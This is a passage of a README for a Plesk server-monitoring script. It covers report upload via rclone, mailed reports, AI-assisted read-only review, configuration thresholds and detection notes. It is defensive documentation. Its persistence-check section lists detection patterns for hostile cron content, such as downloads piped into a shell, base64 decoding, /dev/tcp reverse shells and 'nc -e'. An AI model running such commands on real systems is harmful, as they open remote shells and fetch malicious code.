   | Prompt | Answer |
   |---|---|
   | `n/s/q>` | `n` (new remote) |
   | `name>` | `reports` |
   | `Storage>` | `drive` (Google Drive) |
   | `client_id>` / `client_secret>` | Enter (empty) works, but rclone's built-in client ID is shared by all rclone users worldwide and regularly runs into Google's rate limit (`Error 403 … rateLimitExceeded`, uploads fail). Recommended: [create your own client ID](https://rclone.org/drive/#making-your-own-client-id) and enter it here (free, about 10 minutes). |
   | `scope>` | **`drive.file`**: rclone can only see files it created itself, not the rest of the drive |
   | `service_account_file>` | Enter |
   | `Edit advanced config?` | `n` |
   | `Use web browser to automatically authenticate?` | **`n`**, the server has no browser |

3. rclone now prints a command like `rclone authorize "drive" "eyJ..."`. Run it **on your desktop** (install rclone there, e.g. `winget install Rclone.Rclone`, `brew install rclone`), log in **with the dedicated Google account** and allow access.
4. Copy the token printed on your desktop (`{"access_token":...}`) and paste it on the server at `config_token>`.
5. `Configure this as a Shared Drive?` → `n`, then `y` to save and `q` to quit.
6. Test:
   ```bash
   rclone mkdir reports:server-reports
   rclone lsd reports:
   ```

Deleted reports are removed permanently, not moved to the Drive trash.

### Option B: Microsoft OneDrive

Same flow as Google Drive: `rclone config` → `onedrive`, answer `n` to auto config, run `rclone authorize "onedrive"` on your desktop and log in with a **dedicated Microsoft account**. The token usually grants access to the whole OneDrive, which makes the dedicated account even more important. See [rclone.org/onedrive](https://rclone.org/onedrive/).

> **In the commands below, replace everything in `<ANGLE BRACKETS>`** with your provider's values. They are placeholders, not working defaults.

### Option C: S3-compatible object storage (AWS S3, Backblaze B2, Wasabi, Hetzner, IONOS, …)

The cleanest option security-wise: an access key that can **only write into one bucket**.

```bash
rclone config create reports s3 provider Other \
  access_key_id <ACCESS_KEY_ID> secret_access_key <SECRET_ACCESS_KEY> \
  endpoint <https://S3-ENDPOINT-OF-YOUR-PROVIDER> region <REGION>
```

- Your provider's documentation lists the endpoint and region (for AWS itself use `provider AWS` and omit `endpoint`).
- With S3 the remote path **must start with the bucket name**. Put this in `/etc/plesk-server-report.conf`: `REMOTE="reports:<BUCKET>/${HOST}"`
- Create a dedicated bucket and a key restricted to that bucket.
- Ideally the key has **no delete permission**. Then set `RETENTION_DAYS=0` and let a **bucket lifecycle rule** delete objects after 7 days.
- Keys without permission to create buckets need `RCLONE_S3_NO_CHECK_BUCKET=true` (e.g. as a line `export RCLONE_S3_NO_CHECK_BUCKET=true` in the config file).
- Backblaze B2 natively: `rclone config create reports b2 account <KEY_ID> key <APPLICATION_KEY>` with an application key limited to the bucket. The remote path also starts with the bucket here: `REMOTE="reports:<BUCKET>/${HOST}"`

### Option D: SFTP (Hetzner Storage Box, your own NAS, another server)

```bash
# 1. key pair for the upload, without passphrase (cron has to use it unattended)
ssh-keygen -t ed25519 -N '' -f /root/.ssh/report_upload
# 2. put /root/.ssh/report_upload.pub into ~/.ssh/authorized_keys of <SFTP_USER> on the target
# 3. create the remote
rclone config create reports sftp host <SFTP_HOST> port <PORT, usually 22> user <SFTP_USER> \
  key_file /root/.ssh/report_upload
rclone lsd reports:
```

Use a dedicated user that is chrooted or limited to one directory (e.g. a Storage Box sub-account). The remote path is relative to that user's home directory, so the default `REMOTE="reports:server-reports/${HOST}"` works as is.

### Option E: Nextcloud / WebDAV

```bash
rclone config create reports webdav vendor nextcloud \
  url https://<YOUR-NEXTCLOUD>/remote.php/dav/files/<NEXTCLOUD_USER> \
  user <NEXTCLOUD_USER> pass "$(rclone obscure '<APP_PASSWORD>')"
```

Use a dedicated Nextcloud user and an app password (*Personal settings → Security → Devices & sessions*). For other WebDAV servers use `vendor other` and your server's WebDAV URL.

---

## Reports by mail

Instead of – or in addition to – the upload, the script can mail the reports.

> **Recommended: a mailbox on this server** (e.g. an address of one of your own domains hosted here). Postfix then delivers the mail locally: the reports never travel over the internet, and no cloud storage or other provider gets them (see [Privacy](#privacy-gdpr)). You read them like any other mail, encrypted over IMAP. An address at another provider (Gmail, Microsoft 365, …) works too, but then every report is sent over the internet and stored at that provider – the same data protection questions as with an upload.

Set the address in `/etc/plesk-server-report.conf`:

```bash
REPORT_MAIL_TO="admin@example.com"       # a mailbox on this server; several: space-separated
REPORT_MAIL="alerts summary"             # the default – see the table
REMOTE=""                                # only if you want no upload at all
```

What is mailed: `REPORT_MAIL` takes one or more of these words, separated by spaces, e.g. `"alerts summary"` (default), `"summary"` (only the daily mail) or `"all summary"`:

| Word | Mail |
|---|---|
| `alerts` | the full report as soon as a run has an alert that was not mailed in the last 24 hours. An alert that stays (the same mailbox sending too much in the next run, only with other figures) is not mailed again every run; the daily summary still lists it. Subject: `<host>: WARNING (n, new: m) – <first new alert>` |
| `summary` | `summary.txt` once a day, with the first run from `REPORT_MAIL_HOUR` on (default 6, server time) – also on quiet days, so a missing mail is a sign that something is wrong |
| `all` | every report (with an hourly cron job: 24 mails a day) |

A normal run that finds nothing new sends **no mail** – and the summary only goes out once a day. So right after the setup, test it:

```bash
plesk-server-report.sh --test-mail
```

It mails the newest report to `REPORT_MAIL_TO` at once and follows it in the mail log for up to 20 seconds:

```
Sending report-20261108-1217.txt to admin@example.com (from plesk-server-report@host.example) …
Accepted by the local mail server. Delivery (from the mail log):
  admin@example.com: sent (delivered via plesk_virtual service)
Delivered. If the mail is not in the inbox, look in the spam folder (see README: whitelist the sender).
```

With a mailbox that doesn't exist on this server it says `NOT delivered – Plesk: Unknown user: … (the mail was discarded, no bounce)`. Watch out: Postfix itself logs such a mail as `status=sent`, because it only hands it over to Plesk's delivery (`relay=plesk_virtual`); Plesk then drops it silently. The script reads Plesk's own log line (`postfix-local`) to tell. At another provider, most mail servers reject an unknown address right away – `--test-mail` shows their reply. Some accept the mail first and send a bounce later; that bounce comes back to the sender address, and the next normal run raises an alert for it. `--test-mail` changes nothing in the state: it works any time, also after the daily summary was sent. (Postfix only – with qmail it can't follow the mail and asks you to check the mailbox.)

- The mails are sent with the local `sendmail` (Postfix or qmail, both part of Plesk) from `plesk-server-report@<host name>` (`REPORT_MAIL_FROM`). The script leaves its own mails out of the mail figures of the next report.
- **Did the mail arrive?** The next report checks the mail log: if a report mail was deferred, bounced or dropped by Plesk (wrong address, mailbox missing or full), it raises an alert with the reason. If `sendmail` refuses a mail or is missing, the next report says so in its notes (` i `).
- **The mailbox must really be hosted here.** If a domain exists in Plesk with mail service switched on, but its MX record points elsewhere (e.g. Microsoft 365), Postfix still delivers to the Plesk mailbox, which nobody reads. Use an address whose mail is actually read on this server, or switch off the mail service of that domain in Plesk.
- **Address at another provider:** the sender `plesk-server-report@<host name>` is only signed with DKIM if the host name is a domain in Plesk with mail service. Otherwise set `REPORT_MAIL_FROM` to an address of one of your domains on this server with SPF, DKIM and DMARC, or the receiving provider may reject the mails or file them as spam.
- **Put the sender on the spam filter's whitelist – important.** The reports quote what attackers try: paths like `/wp-admin/`, `/wp-login.php`, `/wp-content/uploads/x.php` and names of sensitive files. SpamAssassin has rules for links to hacked WordPress sites (`URI_WP_HACKED_2`, `URI_WPADMIN`) and counts exactly these as spam signals. On the author's server, the summary of a quiet day already scored 4.1 of the 6.5 points at which Plesk treats a mail as spam. On a day with many attacks – when the mail matters most – it can end up in the spam folder or be deleted. The script can't avoid this, the paths are the content of the report. So add `plesk-server-report@<host name>` (or your `REPORT_MAIL_FROM`) to the whitelist of the receiving mailbox – in Plesk: *Mail* → click the mailbox → *Spam Filter* → open the *advanced settings* → *White list*. A whitelist trusts the sender address, which others could forge; Plesk signs the mails with DKIM, so keep DMARC for the server's domain at `quarantine` or `reject` and forged mails fail it.
- `MASK_MAILBOXES=1` pseudonymises the mails like the uploads.
- **The report watches the mail server it is sent through.** If Postfix hangs, the disk is full or the server is down, no mail arrives – and no mail says so. Notice when the daily summary is missing. With the upload and a daily AI review this gap doesn't exist: the review reports a missing `summary.txt`.
- The mails pile up in the mailbox and are part of the Plesk backup. Delete old ones, e.g. after 30 days, in line with the other retention periods.
- Test runs (`--no-upload`, `--only`) send no mails; `--test-mail` sends one on purpose.

---

## Reading the reports

Every run uploads three kinds of files:

| File | Content |
|---|---|
| `report-YYYYMMDD-HHMM.txt` | the full report of one run (time in the server's time zone, usually UTC) |
| `latest.txt` | a copy of the newest report, including the daily checks and fail2ban |
| `summary.txt` | all reports of the last 24 hours condensed into one file: every run with its status (gaps are easy to spot), every alert with how often and when it was seen, mail and web totals, deliveries per provider, peaks of load and RAM, the backup status of the newest report, and every line of the sections that are normally empty (successful logins, changes of SSH keys, accounts, cron jobs and ports, suspicious processes, IMAP/POP3 logins from other countries, new PHP files in uploads, login ≠ from, webmail, WordPress attacks, traffic peaks, files served with 200) |

- **Yourself:** open `latest.txt`. The first lines tell you everything: `STATUS: OK` or `STATUS: WARNING (n)` followed by the list of alerts (` ! `) and, if any, notes about missing data (` i `, e.g. a log file that was not found – the figures of that section are then 0, not "all clear"). `summary.txt` shows what happened during the day.
- **With an AI assistant (this is how the author uses it, with Claude):** connect an assistant that supports your storage (e.g. a Google Drive or OneDrive connector) **to the dedicated account** and let it review the day every morning as a scheduled task. Reading `summary.txt` and `latest.txt` instead of every single report keeps the review fast and cheap (two files instead of 24), without losing anything: the summary is built from the reports and keeps every alert. Tell the assistant what is normal on your server (known broken sites, mail-only domains, …) so it only reports real changes. Example prompt:

  > In the folder `server-reports/<hostname>`, search for the files `summary.txt` and `latest.txt` by name – don't list the whole folder. Read both. `summary.txt` condenses all reports of the last 24 hours (runs with status, every alert with count and first/last time, totals, every successful login); `latest.txt` is the newest full report with the daily checks and fail2ban. If `summary.txt` is missing or its newest run is more than 2 hours old, report that as an issue. Check the run list for gaps (more than 2 hours between runs). (Both limits assume the hourly cron job – if it runs every N hours, use N + 1 hours.) Alerts starting with "Script:" and the section SCRIPT NOTES mean the report itself is incomplete (a run aborted or still hanging, a command timed out, a log file not found) – report them too. Only if an alert needs more detail, read the single report of that time (`report-YYYYMMDD-HHMM.txt`). Summarise: outgoing spam signals, blocklist listings and rejections by the big mail providers, deliveries to watched recipient domains, mailbox logins from new countries (a login that read no mail is less likely an attack than one that downloaded the mailbox), customers banned by fail2ban (alert starting with "fail2ban:" – include the unban command), new PHP files in uploads, logins from unknown IPs, new SSH keys, accounts, cron jobs, processes or ports (alerts starting with "Access:", "Cron:", "Process:", "Ports:"), failed services, 5xx/PHP errors, pending security updates, a newer script version (mention once), expiring certificates, mail authentication, exposed files, backup status. Lines marked as a recommendation (e.g. missing HSTS) are not an issue – mention them once at the end. Start with "All OK" or "Action required: …", max. 10 bullet points with a concrete next step. Read only, change nothing.

- A daily review **does not replace real-time alerting**. For "server down" use an uptime monitor (e.g. Plesk 360 Monitoring, Uptime Kuma), and set **outgoing mail limits** in Plesk (*Tools & Settings → Outgoing Mail Control*) so a hijacked mailbox is throttled immediately.

---

## What the script remembers

Between runs the script keeps its memory in `/var/lib/plesk-server-report`: where it stopped reading each log, known login IPs, countries per mailbox, the baseline of SSH keys, accounts, cron jobs and ports, the local reports. You never have to touch it – but if you wonder why an alert did not come, or want the script to forget a known IP, [STATE-FILES.md](STATE-FILES.md) describes every file (the same text is kept as `README.txt` in that folder), and `plesk-server-report.sh --show-state` prints what is stored in readable form.

---

## Configuration

**You don't need to change anything here** – the defaults fit a typical Plesk server with an hourly cron job. Override a default only when a report tells you to (e.g. a threshold that is too low for your server) in `/etc/plesk-server-report.conf` (bash syntax; it survives script updates):

```bash
REMOTE="reports:server-reports/myhost"   # "" = local only
RETENTION_DAYS=7                         # 0 = never delete remotely
WEB_IGNORE_DOMAINS="legacy.example old.example"   # no web alerts, still listed
UPLOADS_PHP_IGNORE='/uploads/borlabs-cookie/|/uploads/mailchimp-for-wp/debug-log\.php$|/uploads/my-plugin/'
WARN_IPS_PER_MAILBOX=6
WARN_MAILS_PER_SENDER=300
ALLOWED_COUNTRIES="DE AT CH"              # alert on logins from other countries
GEO_TRUSTED_ORGS="Microsoft"             # no country alerts for this operator (see notes)
```

All thresholds apply **per run**. With the hourly cron job that means per hour; if you run the script less often, raise them accordingly. The defaults with comments are also at the top of the script.

| Variable | Default | Meaning |
|---|---|---|
| `WARN_MAILS_PER_SENDER` | 150 | recipients per envelope sender, counting only mail sent **from** this server (after a mailbox login or by a local script). Incoming mail, e.g. a shop sending many invoices to one of your mailboxes, is listed under *Top senders* but raises no alert |
| `WARN_MAILS_PER_SASL` | 150 | mails submitted by one authenticated mailbox |
| `WARN_IPS_PER_MAILBOX` | 4 | distinct client IPs per mailbox (raise it if many users roam between networks) |
| `WARN_FROM_MISMATCH` | 10 | mails with a sender domain different from the login's domain |
| `WARN_MAILS_PER_SCRIPT` | 100 | mails via PHP `mail()`/sendmail per subscription |
| `WARN_DEFERRED` | 100 | deferred deliveries |
| `WARN_QUEUE` | 200 | messages in the Postfix queue |
| `WATCH_RECIPIENT_DOMAINS` | empty | recipient domains whose deliveries are business-critical, e.g. `"invoices.example.com"` when a customer forwards invoices to an accounting service. Every deferral or bounce to these domains (and their subdomains) raises an alert with the remote reply; the report shows sent / deferred / bounced for each |
| `WARN_BLOCKLIST` | 1 | remote rejections or deferrals mentioning a blocklist, bad reputation, spam or rate limiting (wording of Gmail, Microsoft, Apple iCloud, Yahoo, GMX/web.de and T-Online included). Up to three examples with recipient domain and reply are listed below the count |
| `WARN_AUTH_FAIL` | 300 | failed mail logins (SMTP + IMAP/POP3) and, separately, failed webmail logins. Raise it if routine brute-force noise (already handled by fail2ban) triggers it regularly |
| `DNSBL_LISTS` | Spamhaus ZEN, SpamCop, Barracuda, PSBL | IP blocklists checked for the server IP |
| `WARN_LOAD_FACTOR` | 1.5 | alert when the 5-minute load exceeds CPU cores × this factor |
| `WARN_MEM_AVAIL_PCT` | 10 | alert when available RAM drops below this percentage |
| `WARN_DISK_PCT` | 85 | alert when a filesystem is fuller than this percentage |
| `WARN_CPU_USER_PCT` | 80 | CPU of one system user in the snapshot |
| `WARN_5XX_PER_DOMAIN` / `WARN_PHP_FATAL` | 100 / 20 | web errors per domain |
| `WARN_LOGIN_POSTS` | 300 | POSTs to `wp-login.php`/`xmlrpc.php` per domain |
| `WEB_IGNORE_DOMAINS` | empty | space-separated domains without web alerts (still listed in the report) |
| `UPLOADS_PHP_IGNORE` | Borlabs Cookie, Mailchimp for WP | regex of legitimate PHP files inside `wp-content/uploads` |
| `WARN_LOGIN_DETAIL` | 20 | show login-attack details for domains with at least this many login POSTs |
| `WARN_LOGIN_BRUTE_FAILS` | 5 | alert when an IP logs in to WordPress successfully after at least this many failures |
| `GEOIP` | 1 | 0 switches geolocation off |
| `ALLOWED_COUNTRIES` | empty | ISO country codes, e.g. `"DE AT CH"`. Successful logins from other countries raise an alert. Empty = annotate only, no alerts |
| `GEO_TRUSTED_ORGS` | empty | regex of network operators exempt from country alerts, e.g. `"Microsoft\|Google"` |
| `GEO_DATACENTER_RE` | list of cloud/hosting providers | operators marked as `[datacenter]` |
| `MAILAUTH_CHECK` | 1 | daily SPF/DKIM/DMARC check, 0 = off (needs `dig`, package `bind9-dnsutils`) |
| `MAILAUTH_SHOW_ALL` | 0 | 1 = list every domain, 0 = only domains with findings |
| `MAILAUTH_IGNORE_DOMAINS` | empty | space-separated domains to skip |
| `MAILAUTH_RESOLVER` | `1.1.1.1` | DNS resolver for the SPF/DKIM/DMARC check, `""` = system resolver (see notes) |
| `DKIM_KEY_DIR` / `DKIM_SELECTOR` | `/etc/domainkeys` / `default` | where Plesk keeps the DKIM private keys (`<dir>/<domain>/<selector>`) and the selector it signs with |
| `MAILNAMES_DIR` | `/var/qmail/mailnames` | Plesk mailbox directory (`<dir>/<domain>/<mailbox>`) |
| `SERVER_DNS_CHECK` | 1 | PTR / HELO / IPv6 check, 0 = off |
| `CHECK_IPV6` | `auto` | `auto` = only if the server has a global IPv6 and Postfix uses it (`inet_protocols`), `1` = always, `0` = never |
| `MAIL_TLS_NAME` | server host name | the host name your customers enter in their mail clients. The mail certificate must be valid for it |
| `MAIL_TLS_PORTS` | `25 465 587 993 995` | ports whose certificate is checked (25/587 via STARTTLS, 143/110 also possible) |
| `DOMAIN_DNS_CHECK` | 1 | per-domain A/AAAA, CAA, DNSSEC and domain-blocklist check, 0 = off |
| `DOMAIN_BLOCKLISTS` | `dbl.spamhaus.org multi.surbl.org` | domain blocklists, queried via the local resolver |
| `HTTPS_CHECK` | 1 | daily HSTS and http→https redirect check, 0 = off |
| `ATTACK_STATS` | 1 | hourly attack-pattern, sensitive-file, traffic-peak and ModSecurity statistics |
| `WARN_REQ_PER_MIN` | 600 | alert when a domain's busiest minute exceeds this many requests |
| `WARN_DISTRIBUTED_IPS` | 100 | alert when one URL (static files excluded) is requested by this many different IPs in one run |
| `EXPOSED_FILES_CHECK` / `EXPOSED_FILES_IGNORE` | 1 / SQL files shipped with software | daily scan of the document roots for exposed files. The ignore regex skips schema/upgrade `.sql` files bundled with WordPress plugins, osTicket and phpBB by default. Extend it, don't replace it, unless you want those back |
| `WEBSHELL_CHECK` / `WEBSHELL_IGNORE` | 1 / empty | daily scan of recently changed PHP files for backdoor code, regex of paths to ignore |
| `WEBSHELL_FIRST_DAYS` | 7 | the first scan covers PHP files changed within this many days; later scans cover files changed since the previous scan |
| `PERSISTENCE_CHECK` | 1 | hourly check of SSH keys, accounts, sudo, cron jobs, autostart files, suspicious processes and listening ports (see [Notes](#notes-and-limitations)), 0 = off |
| `PERSISTENCE_IGNORE` | empty | regex on the text of findings of that check to leave out, e.g. `'/tmp/known-tool'` for a tool you run from `/tmp` on purpose |
| `WARN_CERT_DAYS` | 14 | certificate expiry warning |
| `WARN_BACKUP_HOURS` | 26 | maximum age of the last Plesk backup |
| `REMOTE` | `reports:server-reports/<host>` | rclone `remote:path` for the upload, `""` = keep reports locally only |
| `RETENTION_DAYS` / `LOCAL_KEEP_DAYS` | 7 / 7 | delete reports older than this many days remotely / locally (0 = never). Remote deletion is permanent, not into the trash. `latest.txt` and `summary.txt` are replaced as new files on every run instead of being overwritten, so Google Drive keeps no older versions of them. Keep at least one day locally, `summary.txt` is built from the local reports |
| `SUMMARY` / `SUMMARY_HOURS` | 1 / 24 | write and upload `summary.txt`, built from the local reports of the last `SUMMARY_HOURS` (see [Reading the reports](#reading-the-reports)), 0 = off |
| `MAX_RUNTIME` | 50 | minutes after which an unattended (cron) run is stopped, together with every command it started. Keep it below the cron interval. The next run reports the aborted one as an alert. 0 = no limit |
| `CMD_TIMEOUT` | 120 | seconds per external command that can hang (`plesk db`, `fail2ban-client`, `postqueue`, `journalctl`, `systemctl`, `apt-get`, `rclone`). A timeout raises an alert `Script: command timed out …` |
| `FIND_TIMEOUT` | 600 | seconds per file-system scan of the web folders (`find`, `grep`), e.g. if a document root contains a dead network mount. After a timeout the scan is repeated next time instead of being marked as done |
| `IMAP_COUNTRY_KEEP_DAYS` | 30 | days after which a mailbox's foreign country is forgotten if no IMAP/POP3 login came from there; the next login from that country alerts again (see [Notes](#notes-and-limitations)). 0 = never forget |
| `KNOWN_MAIL_IP_DAYS` | 30 | days to remember client IPs of successful mail logins – alert when fail2ban bans one of them |
| `KNOWN_LOGIN_IP_DAYS` | 90 | days to remember an SSH/Plesk login IP without a login from it (0 = never). After that, the next login from it raises "unknown IP" again |
| `UPDATE_CHECK` | 1 | once a day, ask GitHub whether a newer release of the script exists and say so in the daily checks (info only, nothing is installed); 0 = no request |
| `REPORT_MAIL_TO` | empty | mail the reports to this address (several: space-separated). Recommended: a mailbox on this server, so the reports never leave it. See [Reports by mail](#reports-by-mail). Empty = no mails |
| `REPORT_MAIL` | `alerts summary` | what is mailed, one or more words separated by spaces: `alerts` = the report when it has a new alert, `summary` = `summary.txt` once a day, `all` = every report. E.g. `"summary"` = only the daily mail |
| `REPORT_MAIL_HOUR` | 6 | the summary mail goes out with the first run from this hour on (server time, 0–23) |
| `REPORT_MAIL_FROM` | `plesk-server-report@<host>` | sender address of the mails |
| `MASK_MAILBOXES` | 0 | 1 = the uploaded and mailed reports show mail addresses pseudonymised (`mbx-4f2a91@example.com`); the local reports stay complete, `--decode` translates back. See [Privacy](#privacy-gdpr) |
| `MAX_LOG_MB` | 200 | read at most this many MB of new lines per log file and run, the newest part. Protects against huge logs after a long pause or a log that was truncated in place; the skipped part is mentioned in the report. 0 = no limit |
| `STATE_DIR` | `/var/lib/plesk-server-report` | log offsets, known login IPs, daily cache, local reports |
| `VHOST_LOGS` | `/var/www/vhosts/system` | Plesk per-domain log directories |
| `PLESK_PANEL_LOG` | `/var/log/plesk/httpsd_access_log` | access log of the Plesk panel (port 8443), used to detect panel logins |
| `ROUNDCUBE_LOG_DIR` | auto | Roundcube log directory, default `/var/log/plesk-roundcube` or `/usr/share/psa-roundcube/logs` |
| `GEOIP_DIR` | `$STATE_DIR/geoip` | where the DB-IP Lite databases are stored |

---

## First run

- **PHP files in `wp-content/uploads`:** the first run lists all existing ones. Some plugins legitimately store PHP files there (Borlabs Cookie and Mailchimp for WP are excluded by default). Add your own to `UPLOADS_PHP_IGNORE`. Anything else deserves a look: this is the classic place for web shells.
- **IMAP/POP3 countries:** mailboxes already read from abroad at the first run are stored as known (`known_imap_countries`) without an alert.
- **Logins:** all IPs with a successful SSH/panel login in the current logs are stored as known (`/var/lib/plesk-server-report/known_login_ips`). Every later login from a new IP raises an alert once. Remove lines from that file to "forget" an IP.
- **SSH keys, accounts, sudo, cron jobs, autostart files, listening ports:** the first run stores what is there as the baseline (`/var/lib/plesk-server-report/baseline/`) without alerts – except cron jobs and autostart files with suspicious content and suspicious processes, which are reported right away. From then on every change is listed once.
- **To repeat the daily checks today:** `rm /var/lib/plesk-server-report/daily_date`
- **To run single checks right now**, e.g. after fixing a DNS record: `plesk-server-report.sh --only mailauth` (several: `--only mailauth,domaindns`; groups: `hourly`, `daily`, `all`; names: `--list`). The result is printed and nothing else happens: no upload, and log offsets, scan stamps and known login IPs stay as they are, so the next hourly run still sees everything. The on/off switches from the configuration (`MAILAUTH_CHECK` etc.) don't apply to checks named explicitly.
- **For a complete reset:** `rm -rf /var/lib/plesk-server-report`

---

## Notes and limitations

- **Postfix logs `sasl_username` on failed logins too** (recent versions). The script handles this. If you adapt the parsing, keep in mind that a username appearing in the log does not mean the login succeeded.
- **Webmail is analysed from Roundcube's own logs** (`/var/log/plesk-roundcube/sendmail` and `errors`), because Roundcube talks to Postfix and the IMAP server (Dovecot or Courier) from `localhost`: in the mail log those mails carry neither the user's IP nor (on Plesk) the mailbox name. Without this section, a hijacked mailbox sending spam through webmail would be invisible. Roundcube does not log successful logins by default (`log_logins = false`). The script doesn't need them, since every sent mail is logged with mailbox and IP. Leave that Plesk-managed config alone.
- **"Top senders" includes incoming mail** (e.g. newsletters from Amazon SES). The alert for that list only counts mail sent from this server, after a mailbox login or by a local script. The *authenticated mailboxes*, *login ≠ from* and *scripts* sections are the ones that show what your server sends on behalf of your users.
- **Courier IMAP/POP3 and fail2ban:** Plesk's default jails cover Dovecot (`plesk-dovecot`), not Courier. If your server uses Courier, check whether the jail `plesk-courierimap` is switched on – if not, failed IMAP/POP3 logins are never banned. Switch it on in *Tools & Settings → IP Address Banning → Jails*. Before you do, check the *Failed mail logins* section for IPs of your customers: a device with an outdated password retries every few seconds and gets its whole connection banned.
- **Banned customers:** once fail2ban bans an IP, its attempts no longer reach the server – so a customer with an outdated password disappears from the failed-login figures exactly when they can't fetch mail any more. The script remembers the client IPs of successful IMAP/POP3 and SMTP logins for `KNOWN_MAIL_IP_DAYS` (default 30; on the first run also from the rotated mail logs) and raises an alert when a jail bans one of them, with the mailbox and the unban command. The same goes for IPs with earlier SSH or Plesk logins. The alert repeats in every run while the ban lasts; correct the password on the device, then unban.
- **Deliveries per provider:** the report lists outgoing deliveries grouped by the receiving provider, recognized by its MX host (Microsoft, Google, Apple iCloud, GMX/web.de/IONOS, T-Online, Yahoo/AOL, Strato; others by the MX domain, e.g. a company's spam gateway). A provider with many deferrals or bounces shows a delivery problem even when its rejection text isn't one the script knows. Deferrals are counted per delivery attempt, so one mail retried five times counts five times.
- **Spam filter size limit:** SpamAssassin skips mails larger than its limit (Plesk default 256 KB, `SA_MAX_MAIL_SIZE` in `/etc/psa/psa.conf`). Spam waves with large image attachments use exactly that gap. The report counts the skipped mails (`Spam filter: N mail(s) not scanned`); if the number is high, raise the limit (e.g. to `3145728` = 3 MiB).
- **Spamhaus** refuses queries coming through large public DNS resolvers. The report then shows `query-refused`, which means "unknown", not "listed". Use a local resolver for reliable results.
- **Plesk panel logins:** Plesk writes no login events to `panel.log` (it only contains errors), so logins are read from the panel's access log `/var/log/plesk/httpsd_access_log` (Plesk 18 on Debian, Ubuntu and RHEL-based systems). A login is a `POST /login_up.php`; only a successful one is followed by a panel page (`/admin/`, `/smb/` or `/cp/`) with `login_up.php` as referrer. Only the standard access-log fields are used (IP, request, status, referrer), so older log formats work too; logins through a domain (`https://example.com/login.php`, proxied from `127.0.0.1`) are attributed to the real client IP when Plesk logs it. The access log doesn't contain the user name, so the report shows the IP only. Logins that did not reach a panel page are counted as failed attempts. Logins via the Plesk API or "Log in as customer" are not covered. SSH logins are read from `auth.log`/`secure` or the journal.
- **TLS check** connects to the server's public IPv4. Domains that are mail-only, redirected elsewhere or without SSL are listed as "no matching certificate". That line is informational, not an alert.
- **HSTS and http→https check** looks only at domains whose certificate is valid for them and whose A record points to this server – aliases, redirects and mail-only domains can't use HSTS, and for a domain hosted elsewhere this server's headers don't matter. One HEAD request per domain to this server (and one redirect to the same domain with or without `www.` is followed). The header counts no matter who sets it: Plesk, `.htaccess` or a WordPress plugin. Missing HSTS or redirect is a recommendation, not an alert. `max-age` and `preload` are not judged: Plesk's default of six months is fine, and `preload` is hard to undo, so it is the site owner's decision.
- **Backup check** covers Plesk's own backup manager (status from `backup.log` in the PMM log directory). Provider-side snapshots are not visible to the script, except whether an Acronis agent is running.
- **WordPress login success** is derived from the HTTP status: a successful `wp-login.php` POST returns `302`, a failed one `200`. Security plugins that change the login flow (custom login URLs, 2FA, CAPTCHAs) may change these codes. Logins via `xmlrpc.php` always return `200`, so their success cannot be told from the access log. Block `xmlrpc.php` if you don't need it (Plesk: *WordPress Toolkit → Security*).
- **IMAP/POP3 logins** are checked by country as well: an attacker with a guessed password who only reads mail sends nothing, so the sending checks never see him. The report lists every login from outside `ALLOWED_COUNTRIES` (plus a count of all logins checked), but the **alert comes only once per mailbox and country**:
  - *How much was read:* each line says how much mail the sessions from that IP fetched – `no mail read`, or e.g. `48.3 MB of mail read` (Courier: headers and bodies, POP3 downloads; Dovecot: `hdr_bytes`/`body_bytes` of its default logout line). A login that read nothing is typically a phone keeping an idle connection open – for example over a VPN that switched itself on in a hotel Wi-Fi. A login that downloads the whole mailbox from a datacenter is what an attacker does. A session that is still open at the end of the run has no figure yet.
  - *Why only once:* a customer on holiday in Spain who reads mail every day would otherwise raise the same alert in every run for weeks, and real warnings would drown in it. What matters is the *first* login from a new country – on holiday you see it once and know why; after a stolen password you see it too, usually without anyone travelling.
  - *Per mailbox:* a country is only known for the mailbox that used it. `a@example.com` in Spain doesn't make Spain known for `b@example.com`, so the list never turns into a server-wide allowlist.
  - *Forgotten again after `IMAP_COUNTRY_KEEP_DAYS` (default 30):* a country that hasn't been seen for a mailbox for that long is removed. Otherwise every mailbox would collect its holiday countries over the years, and a later break-in from one of them would go unnoticed. With 30 days, a three-week holiday gives one alert on the first day, the next trip months later gives one again, and a customer who regularly reads mail from abroad stays known as long as he keeps doing so. `0` = never forget.
  - The state is kept in `/var/lib/plesk-server-report/known_imap_countries` (`mailbox CC last-seen`, one per line; delete a line to be warned again). On the first run the countries seen at that moment are stored silently.
- **Country alerts and mail apps:** some apps connect to your mail server **from their provider's cloud**, not from the user's device. The Outlook app (iOS/Android) for IMAP accounts uses Microsoft servers, Gmail's "send mail as" uses Google servers, both often outside your country. Those logins show up as `[datacenter]` in another country. If your customers use such apps, add the operator to `GEO_TRUSTED_ORGS`, accepting that attackers on that cloud are then not flagged by country (the IP count and login ≠ from checks still apply). Geolocation is an additional signal, not proof: attackers can use VPNs in your country.
- **Attack patterns** are counted from the request URL only (method, path, query string), not from POST bodies. A count answered with `200` doesn't mean the attack worked: many applications answer every URL with 200. Treat it as a pointer. The ModSecurity section (Plesk's web application firewall, read from each domain's `error_log`) shows what was actually blocked.
- **Sensitive files:** a probe answered with 200 raises an alert only if the requested file **exists in the document root** (document roots are read from the Plesk database). Otherwise it is listed as "200 without such file", which is typical for catch-all routes. The daily document-root scan finds such files before anyone requests them, and asks the web server whether each one is actually reachable from outside (`HTTP 200`) or blocked. Reachable files are listed one by one and raise an alert. Blocked ones are summarized per domain: they are no leak, but old backups in particular are worth cleaning up.
- **Access & persistence:** after a break-in, attackers make sure they can come back – an SSH key, a new account, a cron job that reinstalls the malware every few minutes, a process mining crypto currency. The script compares these every run with the previous run (`baseline/` in the state directory) and lists each change once. It only reads: nothing is deleted, blocked or stopped.
  - *Alerts* come for a new or changed SSH key, account with a login shell, sudo right, sudoers file, for `/etc/ld.so.preload` (normally the file doesn't exist; rootkits use it to load their code into every program), for an account other than root with UID 0, for a new listening TCP port, for a new cron entry of root or the system (`/etc/crontab`, a new file in `/etc/cron.d`) and a new autostart file, and for any cron job or autostart file with suspicious content: a download piped into a shell (`curl … | sh`), `base64 -d`, `/dev/tcp/` (reverse shell), a program in `/tmp`, `/var/tmp` or `/dev/shm` (in a cron line any path there; in an autostart script only a program started from there – scripts use temporary files), interpreter one-liners (`python -c`, `perl -e`), `nc -e`, known miner names. Writing a log to `/tmp` (`> /tmp/x.log`) doesn't count. The alert quotes the suspicious line. When you change something yourself (Plesk "Scheduled Tasks", a new SSH key, `apt` installing a package with a cron file), you get one alert, and that's it.
  - *Listed without alert:* new cron jobs of customers (subscriptions), changed autostart files (package updates), and everything removed.
